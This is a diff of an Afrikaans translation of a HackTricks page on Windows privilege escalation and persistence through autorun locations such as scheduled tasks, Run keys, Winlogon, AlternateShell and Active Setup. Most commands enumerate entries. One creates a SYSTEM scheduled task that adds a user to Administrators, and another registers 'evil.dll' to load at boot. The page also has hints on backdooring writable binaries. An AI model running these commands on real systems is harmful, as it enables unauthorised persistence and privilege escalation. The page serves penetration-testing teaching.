@@ -1,35 +1,36 @@
-# Voorregverhoging met Autoruns
+# Privilege Escalation with Autoruns
+
+{% hint style="success" %}
+Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Ander maniere om HackTricks te ondersteun:
-
-* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
-* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
+* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 <figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
 
-**Bug bounty wenk**: **teken aan** vir **Intigriti**, 'n premium **bug bounty platform geskep deur hackers, vir hackers**! Sluit by ons aan by [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) vandag, en begin om belonings tot **$100,000** te verdien!
+**Bug bounty wenk**: **meld aan** vir **Intigriti**, 'n premium **bug bounty platform geskep deur hackers, vir hackers**! Sluit by ons aan by [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) vandag, en begin verdien bounties tot **$100,000**!
 
 {% embed url="https://go.intigriti.com/hacktricks" %}
 
 ## WMIC
 
-**Wmic** kan gebruik word om programme by **opstart** uit te voer. Sien watter binêre lêers geprogrammeer is om by opstart uit te voer met:
+**Wmic** kan gebruik word om programme op **opstart** te loop. Sien watter binaries geprogrammeer is om opstart te loop met:
 ```bash
 wmic startup get caption,command 2>nul & ^
 Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
 ```
-## Beplande Take
+## Geskeduleerde Take
 
-**Take** kan geskeduleer word om met 'n **sekere frekwensie** uit te voer. Sien watter binêre lêers geskeduleer is om uit te voer met:
+**Take** kan geskeduleer word om met **sekere frekwensie** te loop. Sien watter binêre geskeduleer is om te loop met:
 ```bash
 schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
 schtasks /query /fo LIST 2>nul | findstr TaskName
@@ -40,9 +41,9 @@ Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,Tas
 #You can also write that content on a bat file that is being executed by a scheduled task
 schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
 ```
-## Lêers
+## Folders
 
-Alle bineêre lêers wat in die **Beginlêers geleë is, sal uitgevoer word met die begin van die rekenaar**. Die algemene beginlêers is diegene wat hieronder gelys word, maar die beginlêer word in die register aangedui. [Lees hierdie om te leer waar.](privilege-escalation-with-autorun-binaries.md#startup-path)
+Alle die binêre lêers wat in die **Startup-mappe geleë is, gaan by opstart uitgevoer word**. Die algemene opstartmappe is diegene wat hieronder gelys is, maar die opstartmap word in die register aangedui. [Lees dit om te leer waar.](privilege-escalation-with-autorun-binaries.md#startup-path)
 ```bash
 dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
 dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
@@ -51,15 +52,15 @@ dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
 Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
 Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
 ```
-## Registre
+## Registry
 
 {% hint style="info" %}
-[Nota vanaf hier](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): Die **Wow6432Node** registreerinskrywing dui daarop dat jy 'n 64-bietjie Windows-weergawe hardloop. Die bedryfstelsel gebruik hierdie sleutel om 'n afsonderlike aansig van HKEY\_LOCAL\_MACHINE\SOFTWARE vir 32-bietjie toepassings wat op 64-bietjie Windows-weergawes loop, te vertoon.
+[Nota van hier](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): Die **Wow6432Node** registrasie-invoer dui aan dat jy 'n 64-bis Windows weergawe gebruik. Die bedryfstelsel gebruik hierdie sleutel om 'n aparte weergawe van HKEY\_LOCAL\_MACHINE\SOFTWARE vir 32-bis toepassings wat op 64-bis Windows weergawes loop, te vertoon.
 {% endhint %}
 
-### Hardloop
+### Runs
 
-**Algemeen bekende** AutoRun-registreer:
+**Algemeen bekend** AutoRun registrasie:
 
 * `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
 * `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
@@ -73,9 +74,9 @@ Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
 * `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
 * `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`
 
-Registreersleutels wat bekend staan as **Run** en **RunOnce** is ontwerp om outomaties programme uit te voer elke keer as 'n gebruiker by die stelsel aanteken. Die opdraglyn wat as 'n sleutel se datawaarde toegewys is, is beperk tot 260 karakters of minder.
+Registrasie sleutels bekend as **Run** en **RunOnce** is ontwerp om outomaties programme uit te voer elke keer wanneer 'n gebruiker in die stelsel aanmeld. Die opdraglyn wat as 'n sleutel se datavalue toegeken word, is beperk tot 260 karakters of minder.
 
-**Dienshardloop** (kan outomatiese aanvang van dienste tydens opstart beheer):
+**Diens runs** (kan outomatiese opstart van dienste tydens opstart beheer):
 
 * `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
 * `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
@@ -91,16 +92,16 @@ Registreersleutels wat bekend staan as **Run** en **RunOnce** is ontwerp om outo
 * `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
 * `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`
 
-Op Windows Vista en latere weergawes word die **Run** en **RunOnce** registreersleutels nie outomaties gegenereer nie. Inskrywings in hierdie sleutels kan of direk programme begin of hulle as afhanklikhede spesifiseer. Byvoorbeeld, om 'n DLL-lêer by aanmelding te laai, kan die **RunOnceEx** registreersleutel saam met 'n "Depend" sleutel gebruik word. Dit word gedemonstreer deur 'n registreerinskrywing by te voeg om "C:\temp\evil.dll" tydens die stelselopstart uit te voer:
+Op Windows Vista en later weergawes, word die **Run** en **RunOnce** registrasie sleutels nie outomaties gegenereer nie. Invoere in hierdie sleutels kan of direkte programme begin of hulle as afhanklikhede spesifiseer. Byvoorbeeld, om 'n DLL-lêer by aanmelding te laai, kan 'n mens die **RunOnceEx** registrasie sleutel saam met 'n "Depend" sleutel gebruik. Dit word demonstreer deur 'n registrasie-invoer toe te voeg om "C:\temp\evil.dll" tydens die stelsels opstart uit te voer:
 ```
 reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
 ```
 {% hint style="info" %}
-**Uitbuiting 1**: As jy binne enige van die genoemde register binne **HKLM** kan skryf, kan jy voorregte eskaleer wanneer 'n ander gebruiker inteken.
+**Exploit 1**: As jy binne enige van die genoemde register in **HKLM** kan skryf, kan jy privaathede verhoog wanneer 'n ander gebruiker aanmeld.
 {% endhint %}
 
 {% hint style="info" %}
-**Uitbuiting 2**: As jy enige van die binêre lêers wat op enige van die register binne **HKLM** aangedui word, kan oorskryf, kan jy daardie binêre lêer met 'n agterdeur wysig wanneer 'n ander gebruiker inteken en voorregte eskaleer.
+**Exploit 2**: As jy enige van die binêre wat op enige van die register in **HKLM** aangedui is, kan oorskryf, kan jy daardie binêre met 'n backdoor wysig wanneer 'n ander gebruiker aanmeld en privaathede verhoog.
 {% endhint %}
 ```bash
 #CMD
@@ -157,17 +158,17 @@ Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\Ru
 Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
 Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
 ```
-### Beginpad
+### Startup Path
 
 * `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
 * `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
 * `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
 * `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
 
-Skakels geplaas in die **Begin**-map sal outomaties dienste of toepassings laat begin tydens gebruiker aanmelding of stelselherlaai. Die ligging van die **Begin**-map is in die register vir beide die **Plaaslike Masjien** en **Huidige Gebruiker** scopes gedefinieer. Dit beteken dat enige skakel wat by hierdie gespesifiseerde **Begin**-liggings gevoeg word, sal verseker dat die gekoppelde diens of program begin tydens die aanmelding of herlaaiproses, wat dit 'n eenvoudige metode maak om programme outomaties te skeduleer om te hardloop.
+Kortpaaie wat in die **Startup** gids geplaas word, sal outomaties dienste of toepassings aktiveer om te begin tydens gebruikersaanmelding of stelselhervatting. Die ligging van die **Startup** gids is in die register gedefinieer vir beide die **Local Machine** en **Current User** skope. Dit beteken enige kortpad wat by hierdie gespesifiseerde **Startup** plekke gevoeg word, sal verseker dat die gekoppelde diens of program begin na die aanmeld- of herlaai-proses, wat dit 'n eenvoudige metode maak om programme outomaties te skeduleer.
 
 {% hint style="info" %}
-As jy enige \[Gebruiker] Skelmap onder **HKLM** kan oorskryf, sal jy dit kan rig na 'n deur jou beheerde map en 'n agterdeur plaas wat enige tyd uitgevoer sal word wanneer 'n gebruiker in die stelsel aanmeld en voorregte eskaleer.
+As jy enige \[User] Shell Folder onder **HKLM** kan oorskryf, sal jy in staat wees om dit na 'n gids wat deur jou beheer word, te wys en 'n backdoor te plaas wat uitgevoer sal word wanneer 'n gebruiker in die stelsel aanmeld, wat privilige verhoog.
 {% endhint %}
 ```bash
 reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
@@ -180,11 +181,11 @@ Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion
 Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
 Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
 ```
-### Winlogon-sleutels
+### Winlogon Sleutels
 
 `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
 
-Gewoonlik is die **Userinit**-sleutel ingestel op **userinit.exe**. Indien hierdie sleutel egter gewysig word, sal die gespesifiseerde uitvoerbare lêer ook deur **Winlogon** geopen word wanneer 'n gebruiker aanmeld. Op soortgelyke wyse is die **Shell**-sleutel bedoel om na **explorer.exe** te verwys, wat die verstek-skyf vir Windows is.
+Tipies is die **Userinit** sleutel op **userinit.exe** gestel. As hierdie sleutel egter gewysig word, sal die gespesifiseerde uitvoerbare lêer ook deur **Winlogon** begin word wanneer die gebruiker aanmeld. Op soortgelyke wyse is die **Shell** sleutel bedoel om na **explorer.exe** te verwys, wat die standaard skulp is vir Windows.
 ```bash
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
@@ -192,68 +193,68 @@ Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVers
 Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
 ```
 {% hint style="info" %}
-As jy die registerwaarde of die binêre lêer kan oorskryf, sal jy in staat wees om voorregte te eskaleer.
+As jy die registriewaarde of die binêre kan oorskryf, sal jy in staat wees om voorregte te verhoog.
 {% endhint %}
 
-### Beleidsinstellings
+### Beleid Instellings
 
 * `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
 * `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
 
-Kyk na die **Run** sleutel.
+Kontroleer **Run** sleutel.
 ```bash
 reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
 reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
 Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
 Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
 ```
-### Alternatiewe Skel
+### AlternateShell
 
-### Verandering van die Veilige Modus-opdragprompt
+### Verandering van die Veilige Modus Opdragprompt
 
-In die Windows-register onder `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`, is daar 'n **`AlternateShell`** waarde wat standaard na `cmd.exe` ingestel is. Dit beteken wanneer jy "Veilige Modus met Opdragprompt" kies tydens opstart (deur F8 te druk), word `cmd.exe` gebruik. Dit is egter moontlik om jou rekenaar so in te stel dat dit outomaties in hierdie modus begin sonder om F8 te druk en dit handmatig te kies.
+In die Windows-register onder `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`, is daar 'n **`AlternateShell`** waarde wat standaard op `cmd.exe` gestel is. Dit beteken wanneer jy "Veilige Modus met Opdragprompt" tydens opstart (deur F8 te druk) kies, word `cmd.exe` gebruik. Maar, dit is moontlik om jou rekenaar op te stel om outomaties in hierdie modus te begin sonder om F8 te druk en dit handmatig te kies.
 
-Stappe om 'n opstartopsie te skep om outomaties in "Veilige Modus met Opdragprompt" te begin:
+Stappe om 'n opstartopsie te skep vir outomatiese begin in "Veilige Modus met Opdragprompt":
 
-1. Verander die eienskappe van die `boot.ini` lêer om die skryfbeskerming, stelsel, en versteekte vlae te verwyder: `attrib c:\boot.ini -r -s -h`
+1. Verander eienskappe van die `boot.ini` lêer om lees-alleen, stelsels, en versteekte vlae te verwyder: `attrib c:\boot.ini -r -s -h`
 2. Maak `boot.ini` oop vir redigering.
-3. Voeg 'n lyn soos hierdie in: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
+3. Voeg 'n lyn soos: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)` in.
 4. Stoor veranderinge aan `boot.ini`.
-5. Herstel die oorspronklike lêereienskappe: `attrib c:\boot.ini +r +s +h`
+5. Herstel die oorspronklike lêereienskap: `attrib c:\boot.ini +r +s +h`
 
-* **Uitbuiting 1:** Die verandering van die **AlternateShell** register sleutel maak aanpasbare opset van 'n opdragskel moontlik, moontlik vir ongemagtigde toegang.
-* **Uitbuiting 2 (PAD Skryfregte):** Om skryfregte te hê na enige deel van die stelsel se **PAD** veranderlike, veral voor `C:\Windows\system32`, laat jou toe om 'n aangepaste `cmd.exe` uit te voer, wat 'n agterdeur kan wees as die stelsel in Veilige Modus begin.
-* **Uitbuiting 3 (PAD en boot.ini Skryfregte):** Skryftoegang tot `boot.ini` maak outomatiese Veilige Modus-opstart moontlik, wat ongemagtigde toegang op die volgende herlaaiing fasiliteer.
+* **Exploit 1:** Die verandering van die **AlternateShell** register sleutel laat 'n pasgemaakte opdragskulp opstelling toe, moontlik vir ongeoorloofde toegang.
+* **Exploit 2 (PATH Skryf Toestemmings):** Om skryftoestemmings te hê na enige deel van die stelsel **PATH** veranderlike, veral voor `C:\Windows\system32`, laat jou toe om 'n pasgemaakte `cmd.exe` uit te voer, wat 'n agterdeur kan wees as die stelsel in Veilige Modus begin.
+* **Exploit 3 (PATH en boot.ini Skryf Toestemmings):** Skryf toegang tot `boot.ini` stel outomatiese Veilige Modus opstart in staat, wat ongeoorloofde toegang op die volgende herbegin vergemaklik.
 
 Om die huidige **AlternateShell** instelling te kontroleer, gebruik hierdie opdragte:
 ```bash
 reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
 Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
 ```
-### Geïnstalleerde Komponent
+### Gemonteerde Komponent
 
-Active Setup is 'n kenmerk in Windows wat **geïnisieer word voordat die lessenaar-omgewing heeltemal gelaai is**. Dit gee prioriteit aan die uitvoering van sekere opdragte wat moet voltooi word voordat die gebruiker se aanmelding voortgaan. Hierdie proses vind selfs plaas voordat ander aanvanginskrywings, soos dié in die Run of RunOnce registerafdelings, geaktiveer word.
+Active Setup is 'n kenmerk in Windows wat **begin voordat die desktopomgewing ten volle gelaai is**. Dit prioritiseer die uitvoering van sekere opdragte, wat moet voltooi voordat die gebruiker se aanmelding voortgaan. Hierdie proses vind plaas selfs voordat ander opstartinge, soos dié in die Run of RunOnce registries, geaktiveer word.
 
-Active Setup word bestuur deur die volgende register sleutels:
+Active Setup word bestuur deur die volgende registriesleutels:
 
-- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
-- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
-- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
-- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
+* `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
+* `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
+* `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
+* `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
 
-Binne hierdie sleutels bestaan verskeie sub-sleutels, elk wat ooreenstem met 'n spesifieke komponent. Sleutelwaardes van besondere belang sluit in:
+Binne hierdie sleutels bestaan verskeie subsleutels, elk wat ooreenstem met 'n spesifieke komponent. Sleutelwaardes van besondere belang sluit in:
 
-- **IsInstalled:**
-  - `0` dui aan dat die komponent se opdrag nie uitgevoer sal word nie.
-  - `1` beteken die opdrag sal een keer vir elke gebruiker uitgevoer word, wat die verstekgedrag is as die `IsInstalled`-waarde ontbreek.
-- **StubPath:** Definieer die opdrag wat deur Active Setup uitgevoer moet word. Dit kan enige geldige opdraglyn wees, soos die begin van `notepad`.
+* **IsInstalled:**
+* `0` dui aan dat die komponent se opdrag nie sal uitvoer nie.
+* `1` beteken die opdrag sal een keer vir elke gebruiker uitvoer, wat die standaardgedrag is as die `IsInstalled` waarde ontbreek.
+* **StubPath:** Definieer die opdrag wat deur Active Setup uitgevoer moet word. Dit kan enige geldige opdraglyn wees, soos om `notepad` te begin.
 
 **Sekuriteitsinsigte:**
 
-- Die wysiging of skryf na 'n sleutel waar **`IsInstalled`** op `"1"` ingestel is met 'n spesifieke **`StubPath`** kan lei tot ongemagtigde opdraguitvoering, moontlik vir voorreg-escalasie.
-- Die verandering van die binêre lêer waarna verwys word in enige **`StubPath`**-waarde kan ook voorreg-escalasie bereik, mits voldoende regte beskikbaar is.
+* Om 'n sleutel te wysig of na 'n sleutel te skryf waar **`IsInstalled`** op `"1"` gestel is met 'n spesifieke **`StubPath`** kan lei tot ongeoorloofde opdraguitvoering, moontlik vir privilige-escalasie.
+* Om die binêre lêer wat in enige **`StubPath`** waarde verwys, te verander kan ook privilige-escalasie bereik, gegewe voldoende regte.
 
-Om die **`StubPath`**-konfigurasies oor Active Setup komponente te ondersoek, kan hierdie opdragte gebruik word:
+Om die **`StubPath`** konfigurasies oor Active Setup komponente te inspekteer, kan hierdie opdragte gebruik word:
 ```bash
 reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
 reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
@@ -262,32 +263,32 @@ reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components
 ```
 ### Browser Helper Objects
 
-### Oorsig van Browser Helper Objects (BHO's)
+### Oorsig van Browser Helper Objects (BHOs)
 
-Browser Helper Objects (BHO's) is DLL-modules wat ekstra kenmerke byvoeg aan Microsoft se Internet Explorer. Hulle laai in Internet Explorer en Windows Explorer by elke begin. Tog kan hulle uitgevoer word deur die **NoExplorer** sleutel na 1 te stel, wat voorkom dat hulle saam met Windows Explorer-instanties laai.
+Browser Helper Objects (BHOs) is DLL-modules wat ekstra funksies by Microsoft se Internet Explorer voeg. Hulle laai in Internet Explorer en Windows Explorer by elke begin. Tog kan hul uitvoering geblokkeer word deur die **NoExplorer** sleutel op 1 te stel, wat voorkom dat hulle saam met Windows Explorer-instansies laai.
 
-BHO's is versoenbaar met Windows 10 via Internet Explorer 11, maar word nie ondersteun in Microsoft Edge nie, die verstekblaaier in nuwer weergawes van Windows.
+BHOs is versoenbaar met Windows 10 via Internet Explorer 11, maar word nie ondersteun in Microsoft Edge, die standaardblaaier in nuwer weergawes van Windows nie.
 
-Om BHO's wat op 'n stelsel geregistreer is te verken, kan jy die volgende register sleutels ondersoek:
+Om BHOs wat op 'n stelsel geregistreer is te verken, kan jy die volgende registrasiesleutels inspekteer:
 
 * `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
 * `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
 
-Elke BHO word verteenwoordig deur sy **CLSID** in die register, wat as 'n unieke identifiseerder dien. Gedetailleerde inligting oor elke CLSID kan gevind word onder `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.
+Elke BHO word verteenwoordig deur sy **CLSID** in die registrasie, wat as 'n unieke identifiseerder dien. Gedetailleerde inligting oor elke CLSID kan onder `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}` gevind word.
 
-Vir die ondervraging van BHO's in die register, kan hierdie opdragte gebruik word:
+Vir die opvra van BHOs in die registrasie, kan hierdie opdragte gebruik word:
 ```bash
 reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
 reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
 ```
-### Internet Explorer-uitbreidings
+### Internet Explorer Uitbreidings
 
 * `HKLM\Software\Microsoft\Internet Explorer\Extensions`
 * `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`
 
-Merk op dat die register vir elke dll 1 nuwe register sal bevat en dit sal verteenwoordig word deur die **CLSID**. Jy kan die CLSID-inligting vind in `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`
+Let daarop dat die registrasie 1 nuwe registrasie per elke dll sal bevat en dit sal verteenwoordig word deur die **CLSID**. Jy kan die CLSID-inligting vind in `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`
 
-### Lettertipe-bestuurders
+### Lettertipe bestuurders
 
 * `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
 * `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
@@ -297,7 +298,7 @@ reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Dr
 Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
 Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
 ```
-### Oop Opdrag
+### Open Command
 
 * `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
 * `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
@@ -314,7 +315,7 @@ HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Executi
 ```
 ## SysInternals
 
-Let wel dat alle plekke waar jy autoruns kan vind **reeds deursoek is deur** [**winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). Nietemin, vir 'n **meer omvattende lys van outomaties uitgevoerde** lêers kan jy [autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) van SysInternals gebruik:
+Let daarop dat al die webwerwe waar jy autoruns kan vind **reeds deur**[ **winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe) gesoek is. egter, vir 'n **meer omvattende lys van outomaties uitgevoerde** lêers kan jy [autoruns ](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) van sysinternals gebruik:
 ```
 autorunsc.exe -m -nobanner -a * -ct /accepteula
 ```
@@ -331,20 +332,21 @@ autorunsc.exe -m -nobanner -a * -ct /accepteula
 
 <figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
 
-**Bug bounty wenk**: **teken aan** vir **Intigriti**, 'n premium **bug bounty platform geskep deur hackers, vir hackers**! Sluit by ons aan by [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) vandag, en begin om belonings te verdien tot **$100,000**!
+**Bug bounty wenk**: **meld aan** vir **Intigriti**, 'n premium **bug bounty platform geskep deur hackers, vir hackers**! Sluit vandag by ons aan by [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) en begin om bounties tot **$100,000** te verdien!
 
 {% embed url="https://go.intigriti.com/hacktricks" %}
 
+{% hint style="success" %}
+Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Leer AWS hak vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Ondersteun HackTricks</summary>
 
-Ander maniere om HackTricks te ondersteun:
-
-* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
-* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
+* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
